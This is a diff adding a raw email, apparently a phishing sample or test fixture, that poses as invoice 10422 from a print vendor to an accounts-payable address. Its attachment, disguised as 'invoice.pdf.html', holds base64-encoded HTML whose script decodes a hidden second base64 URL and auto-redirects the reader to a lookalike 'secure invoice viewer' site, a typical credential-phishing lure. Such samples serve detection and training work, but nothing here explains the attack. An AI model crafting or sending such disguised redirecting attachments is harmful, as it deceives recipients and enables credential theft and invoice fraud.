@@ -1,0 +1,43 @@
+Return-Path: <billing@acme-print-services.example>
+Received: from mail.acme-print-services.example
+ (mail.acme-print-services.example [203.0.113.140]) by mx1.corp.example
+ (Postfix) with ESMTPS id R2; Fri, 30 Oct 2026 09:12:00 +0300
+Authentication-Results: mx1.corp.example; spf=pass
+ smtp.mailfrom=acme-print-services.example; dkim=pass
+ header.d=acme-print-services.example; dmarc=none
+ header.from=acme-print-services.example
+From: "Billing" <billing@acme-print-services.example>
+To: ap@corp.example
+Subject: Invoice 10422 - October print run
+Date: Fri, 30 Oct 2026 09:12:00 +0300
+Message-ID:
+ <179339087615.19452.6203619737186921628@mail.acme-print-services.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============0455566273658137773=="
+
+--===============0455566273658137773==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+
+Please find attached the invoice for the October print run. Open the attached=
+ file to view the invoice in your browser.
+
+Kind regards,
+Billing Team
+Acme Print Services
+
+--===============0455566273658137773==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.html"
+MIME-Version: 1.0
+
+PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkludm9pY2U8L3RpdGxlPjwvaGVhZD48
+Ym9keSBzdHlsZT0iZm9udC1mYW1pbHk6QXJpYWwiPjxwPkxvYWRpbmcgc2VjdXJlIGludm9pY2Ug
+dmlld2VyLi4uPC9wPjxzY3JpcHQ+dmFyIHA9YXRvYigiYUhSMGNITTZMeTlwYm5admFXTmxMWFpw
+WlhkbGNpMXpaV04xY21VdVpYaGhiWEJzWlM5cGJuWXZQMmxrUFRJeU9URT0iKTt3aW5kb3cubG9j
+YXRpb24ucmVwbGFjZShwKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==
+
+--===============0455566273658137773==--
